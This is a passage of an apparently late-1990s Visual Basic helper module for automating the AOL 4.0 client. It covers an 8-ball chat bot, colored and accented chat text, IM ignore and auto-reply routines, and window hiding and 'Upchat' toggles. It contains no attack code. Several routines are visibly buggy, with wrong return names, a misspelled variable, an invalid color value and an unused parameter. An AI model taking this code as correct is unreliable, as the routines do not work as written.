SendChat ("<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & ">" & "‹›·´¯`·._.·• " & G$ & "v¹·¹" & L$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> • " & aa$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> • ")
End Sub

Sub Bot_EightBall()
Dim Lst As String
Dim Text As String
Dim cht As Integer
Dim txt As String
Dim nws As String
Dim who As String
Dim wht As String
Dim r As Integer
Dim E As Integer
Dim M As Integer
Dim x
Dim Y
Geno:
Y = UserSN()
Aol% = FindWindow("AOL Frame25", 0&)
cht = FindChildByClass(Aol%, "_AOL_View")
txt = WinCaption(cht)
If Lst = "" Then Lst = txt
If txt = Lst Then Exit Sub
Lst = txt
nws = LastChatLine(txt)
who = Mid(nws, 2, InStr(nws, ":") - 2)
wht = Mid(nws, Len(who) + 4, Len(nws) - Len(who))
If LCase(Trim(Trim(Y))) = LCase(Trim(Trim(who))) Then GoTo Geno
r = getparent(cht)
E = FindChildByClass(r, "_AOL_Edit")
tixt = RandomNumber(11)
If tixt = "1" Then
tixt = "Looks doubtful."
ElseIf tixt = "2" Then: tixt = "Definately YES!"
ElseIf tixt = "3" Then: tixt = "Definately No!"
ElseIf tixt = "4" Then: tixt = "Not a FuKin chance"
ElseIf tixt = "5" Then: tixt = "HEEELLLLLLLLLLLLLLL nO"
ElseIf tixt = "6" Then: tixt = "gen yeA!"
ElseIf tixt = "7" Then: tixt = "Response HaZey try again."
ElseIf tixt = "8" Then: tixt = "ProbabLee"
ElseIf tixt = "9" Then: tixt = "yep yep"
ElseIf tixt = "10" Then: tixt = "I'm not suRe"
ElseIf tixt = "11" Then: tixt = "AbsolootLee yeZ"

End If
Text = wht$
W = InStr(LCase$(Text), LCase$("if"))
If W <> 0 Then
SendChat "•––•^v^•{‡ " & who & ", The 8-ball say: " & tixt
Timeout 0.5
GoTo Geno
End If

End Sub


Sub KillGlyph()
' Kills the annoying spinning AOL logo in the toobar
' on AOL 4.0
Aol% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(Aol%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
Glyph% = FindChildByClass(AOTool2%, "_AOL_Glyph")
Call SendMessage(Glyph%, WM_CLOSE, 0, 0)
End Sub


Function CoLoRChaTBlueBlack(thetext As String)
G$ = thetext
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#00F" & Chr$(34) & ">" & r$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#F0000" & Chr$(34) & ">" & S$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & T$
Next W
CoLoRChaT = p$
End Function
Function ColorChatRedGreen(thetext)
G$ = thetext
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & ">" & r$ & "<FONT COLOR=" & Chr$(34) & "#006400" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & ">" & S$ & "<FONT COLOR=" & Chr$(34) & "#006400" & Chr$(34) & ">" & T$
Next W
ColorChatRedGreen = p$

End Function
Function ColorChatRedBlue(thetext)
G$ = thetext
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & ">" & r$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & ">" & S$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & T$
Next W
ColorChatRedBlue = p$

End Function

Function TrimTime()
b$ = Left$(Time$, 5)
HourH$ = Left$(b$, 2)
HourA = Val(HourH$)
If HourA >= 12 Then Ap$ = "PM"
If HourA = 24 Or HourA < 12 Then Ap$ = "AM"
If HourA > 12 Then
    HourA = HourA - 12
End If
If HourA = 0 Then HourA = 12
HourH$ = Str$(HourA)
TrimTime = HourH$ & Right$(b$, 3) & " " & Ap$
End Function
Function TrimTime2()
b$ = Time$
HourH$ = Left$(b$, 2)
HourA = Val(HourH$)
If HourA >= 12 Then Ap$ = "PM"
If HourA = 24 Or HourA < 12 Then Ap$ = "AM"
If HourA > 12 Then
    HourA = HourA - 12
End If
If HourA = 0 Then HourA = 12
HourH$ = Str$(HourA)
TrimTime2 = HourH$ & ":" & Right$(b$, 5) & " " & Ap$
End Function

Function EliteText(Word$)
Made$ = ""
For Q = 1 To Len(Word$)
    letter$ = ""
    letter$ = Mid$(Word$, Q, 1)
    leet$ = ""
    x = Int(Rnd * 3 + 1)
    If letter$ = "a" Then
    If x = 1 Then leet$ = "â"
    If x = 2 Then leet$ = "å"
    If x = 3 Then leet$ = "ä"
    End If
    If letter$ = "b" Then leet$ = "b"
    If letter$ = "c" Then leet$ = "ç"
    If letter$ = "e" Then
    If x = 1 Then leet$ = "ë"
    If x = 2 Then leet$ = "ê"
    If x = 3 Then leet$ = "é"
    End If
    If letter$ = "i" Then
    If x = 1 Then leet$ = "ì"
    If x = 2 Then leet$ = "ï"
    If x = 3 Then leet$ = "î"
    End If
    If letter$ = "j" Then leet$ = ",j"
    If letter$ = "n" Then leet$ = "ñ"
    If letter$ = "o" Then
    If x = 1 Then leet$ = "ô"
    If x = 2 Then leet$ = "ð"
    If x = 3 Then leet$ = "õ"
    End If
    If letter$ = "s" Then leet$ = "š"
    If letter$ = "t" Then leet$ = "†"
    If letter$ = "u" Then
    If x = 1 Then leet$ = "ù"
    If x = 2 Then leet$ = "û"
    If x = 3 Then leet$ = "ü"
    End If
    If letter$ = "w" Then leet$ = "vv"
    If letter$ = "y" Then leet$ = "ÿ"
    If letter$ = "0" Then leet$ = "Ø"
    If letter$ = "A" Then
    If x = 1 Then leet$ = "Å"
    If x = 2 Then leet$ = "Ä"
    If x = 3 Then leet$ = "Ã"
    End If
    If letter$ = "B" Then leet$ = "ß"
    If letter$ = "C" Then leet$ = "Ç"
    If letter$ = "D" Then leet$ = "Ð"
    If letter$ = "E" Then leet$ = "Ë"
    If letter$ = "I" Then
    If x = 1 Then leet$ = "Ï"
    If x = 2 Then leet$ = "Î"
    If x = 3 Then leet$ = "Í"
    End If
    If letter$ = "N" Then leet$ = "Ñ"
    If letter$ = "O" Then leet$ = "Õ"
    If letter$ = "S" Then leet$ = "Š"
    If letter$ = "U" Then leet$ = "Û"
    If letter$ = "W" Then leet$ = "VV"
    If letter$ = "Y" Then leet$ = "Ý"
    If Len(leet$) = 0 Then leet$ = letter$
    Made$ = Made$ & leet$
Next Q

EliteText = Made$

End Function

Sub MyName()
SendChat ("<FONT FACE=" & Chr$(34) & "ARIAL" & Chr$(34) & ">" & "<B>      :::               :::       ::::::::::: ")
Call Timeout(0.15)
SendChat ("<FONT FACE=" & Chr$(34) & "ARIAL" & Chr$(34) & ">" & "<B>      :::    :::::::    :::           :::")
Call Timeout(0.15)
SendChat ("<FONT FACE=" & Chr$(34) & "ARIAL" & Chr$(34) & ">" & "<B>:::   :::   :::   :::   :::           :::")
Call Timeout(0.15)
SendChat ("<FONT FACE=" & Chr$(34) & "ARIAL" & Chr$(34) & ">" & "<B> :::::::     :::::::    :::::::::     :::")
End Sub

Sub IMIgnore(TheList As ListBox)
Aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(Aol%, "MDIClient")
IM% = FindChildByTitle(MDI%, ">Instant Message From:")
If IM% <> 0 Then
    For findsn = 0 To TheList.ListCount
        If LCase$(TheList.List(findsn)) = LCase$(SNfromIM) Then
            BadIM% = IM%
            IMRICH% = FindChildByClass(BadIM%, "RICHCNTL")
            Call SendMessage(IMRICH%, WM_CLOSE, 0, 0)
            Call SendMessage(BadIM%, WM_CLOSE, 0, 0)
        End If
    Next findsn
End If
End Sub
Function SNfromIM()

Aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(Aol%, "MDIClient") '

IM% = FindChildByTitle(MDI%, ">Instant Message From:")
If IM% Then GoTo Greed
IM% = FindChildByTitle(MDI%, "  Instant Message From:")
If IM% Then GoTo Greed
Exit Function
Greed:
IMCap$ = GetCaption(IM%)
TheSN$ = Mid(IMCap$, InStr(IMCap$, ":") + 2)
SNfromIM = TheSN$

End Function

Sub Playwav(file)
SoundName$ = file
   wFlags% = SND_ASYNC Or SND_NODEFAULT
   x% = sndPlaySound(SoundName$, wFlags%)

End Sub

Sub KillModal()
MODAL% = FindWindow("_AOL_Modal", vbNullString)
Call SendMessage(MODAL%, WM_CLOSE, 0, 0)
End Sub

Sub waitforok()
Do
DoEvents
okw = FindWindow("#32770", "America Online")
If proG_STAT$ = "OFF" Then
Exit Sub
Exit Do
End If

DoEvents
Loop Until okw <> 0
   
    okb = FindChildByTitle(okw, "OK")
    okd = sendmessagebynum(okb, WM_LBUTTONDOWN, 0, 0&)
    oku = sendmessagebynum(okb, WM_LBUTTONUP, 0, 0&)


End Sub

Function WavY(thetext As String)
G$ = thetext
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<sup>" & r$ & "</sup>" & U$ & "<sub>" & S$ & "</sub>" & T$
Next W
WavY = p$

End Function

Sub Pause(interval)
current = Timer
Do While Timer - current < Val(interval)
DoEvents
Loop
End Sub

Sub centerform(f As Form)
f.Top = (Screen.Height * 0.85) / 2 - f.Height / 2
f.Left = Screen.Width / 2 - f.Width / 2
End Sub
Sub RespondIM(Message)
'This finds an IM sent to you, answers it with a
'message of "message", sends it and then closes the
'IM window
Aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(Aol%, "MDIClient")

IM% = FindChildByTitle(MDI%, ">Instant Message From:")
If IM% Then GoTo Greed
IM% = FindChildByTitle(MDI%, "  Instant Message From:")
If IM% Then GoTo Greed
Exit Sub
Greed:
E = FindChildByClass(IM%, "RICHCNTL")

E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)
List1.AddItem SNfromIM
List1.AddItem MessageFromIM
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
e2 = GetWindow(E, GW_HWNDNEXT) 'Send Text
E = GetWindow(e2, GW_HWNDNEXT) 'Send Button
Call SendMEssageByString(e2, WM_SETTEXT, 0, Text1)
ClickIcon (E)
Call Timeout(0.8)
IM% = FindChildByTitle(MDI%, "  Instant Message From:")
E = FindChildByClass(IM%, "RICHCNTL")
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT) 'cancel button...
'to close the IM window
ClickIcon (E)
End Sub

Function MessageFromIM()
Aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(Aol%, "MDIClient")

IM% = FindChildByTitle(MDI%, ">Instant Message From:")
If IM% Then GoTo Greed
IM% = FindChildByTitle(MDI%, "  Instant Message From:")
If IM% Then GoTo Greed
Exit Function
Greed:
imtext% = FindChildByClass(IM%, "RICHCNTL")
IMmessage = GetText(imtext%)
SN = SNfromIM()
snlen = Len(SNfromIM()) + 3
blah = Mid(IMmessage, InStr(IMmessagge, SN) + snlen)
MessageFromIM = Left(blah, Len(blah) - 1)
End Function

Sub RunMenu(menu1 As Integer, menu2 As Integer)
Dim AOLWorks As Long
Static Working As Integer

AOLMenus% = GetMenu(FindWindow("AOL Frame25", vbNullString))
AOLSubMenu% = GetSubMenu(AOLMenus%, menu1)
AOLItemID = GetMenuItemID(AOLSubMenu%, menu2)
AOLWorks = CLng(0) * &H10000 Or Working
ClickAOLMenu = sendmessagebynum(FindWindow("AOL Frame25", vbNullString), 273, AOLItemID, 0&)

End Sub

Sub RunMenuByString(Application, StringSearch)
ToSearch% = GetMenu(Application)
MenuCount% = GetMenuItemCount(ToSearch%)

For FindString = 0 To MenuCount% - 1
ToSearchSub% = GetSubMenu(ToSearch%, FindString)
MenuItemCount% = GetMenuItemCount(ToSearchSub%)

For GetString = 0 To MenuItemCount% - 1
SubCount% = GetMenuItemID(ToSearchSub%, GetString)
MenuString$ = String$(100, " ")
GetStringMenu% = GetMenuString(ToSearchSub%, SubCount%, MenuString$, 100, 1)

If InStr(UCase(MenuString$), UCase(StringSearch)) Then
MenuItem% = SubCount%
GoTo MatchString
End If

Next GetString

Next FindString
MatchString:
RunTheMenu% = SendMessage(Application, WM_COMMAND, MenuItem%, 0)
End Sub


Sub Upchat()
Aol% = FindWindow("AOL Frame25", vbNullString)
AOModal% = FindChildByClass(Aol%, "_AOL_Modal")
AOGauge% = FindChildByClass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
Call EnableWindow(Aol%, 1)
Call EnableWindow(Upp%, 0)
End Sub

Sub UnUpchat()
Aol% = FindWindow("AOL Frame25", vbNullString)
AOModal% = FindChildByClass(Aol%, "_AOL_Modal")
AOGauge% = FindChildByClass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
Call EnableWindow(Upp%, 1)
Call EnableWindow(Aol%, 0)
End Sub

Sub HideAOL()
Aol% = FindWindow("AOL Frame25", vbNullString)
Call showwindow(Aol%, 0)
End Sub

Sub ShowAOL()
Aol% = FindWindow("AOL Frame25", vbNullString)
Call showwindow(Aol%, 5)
End Sub

